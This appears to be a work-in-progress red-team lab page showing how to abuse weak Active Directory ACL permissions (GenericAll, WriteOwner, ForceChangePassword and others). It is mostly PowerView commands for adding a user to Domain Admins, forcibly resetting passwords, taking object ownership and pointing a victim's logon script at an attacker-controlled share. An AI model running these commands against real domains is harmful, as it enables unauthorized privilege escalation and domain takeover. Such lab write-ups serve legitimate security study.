# Abusing Active Directory ACLs/ACEs

{% hint style="danger" %}
WIP
{% endhint %}

## Context

In this lab I am exploring ways to abuse weak permissions of Active Directory Distrctionary Access Control Lists \(DACLs\) and their Acccess Control Entries \(ACEs\).

Some of the Active Directory object permissions and types that we as attackers are interested in:

* **GenericAll** - full rights to the object \(add users to a group or reset user's password\)
* **GenericWrite** - update object's attributes \(i.e logon script\)
* **WriteOwner** - change object owner to attacker and have full control over the object
* **WriteDACL** - modify object's ACEs and give attacker full control right over the object
* **AllExtendedRights** - ability to add user to a group or reset password
* **ForceChangePassword** - ability to change user's password
* **Self \(Self-Membership\)** - ability to add yourself to a group

## Execution

### GenericAll on User

```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-07-20-17-14.png)

![](../../.gitbook/assets/screenshot-from-2018-11-07-20-19-43.png)

![](../../.gitbook/assets/screenshot-from-2018-11-07-20-23-18.png)

### GenericAll on Group

```csharp
Get-NetGroup "domain admins" -FullData
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-09-50-20.png)

```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-09-52-10.png)

```csharp
net group "domain admins" spotless /add /domain
```

![](../../.gitbook/assets/peek-2018-11-08-10-07.gif)

```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

### WriteProperty on Group

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-11-11.png)

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-06-32.png)

### Self \(Self-Membership\) on Group

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-23-52.png)

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-25-23.png)

### WriteProperty \(Self-Membership\)

```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-15-21-35.png)

```csharp
net group "domain admins" spotless /add /domain
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-15-22-50.png)

### **ForceChangePassword**

```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-12-30-11.png)

```csharp
# powerview
Set-DomainUserPassword -Identity delegate -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-12-31-52.png)

or a one liner:

```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-12-58-25.png)

```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-14-11-25.png)

### WriteOwner on Group

![](../../.gitbook/assets/screenshot-from-2018-11-08-16-45-36.png)

```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-16-45-42.png)

```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-16-54-59.png)

### GenericWrite on User

```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-19-12-04.png)

```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-19-13-45.png)





## References

{% embed url="https://wald0.com/?p=112" %}

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2" %}

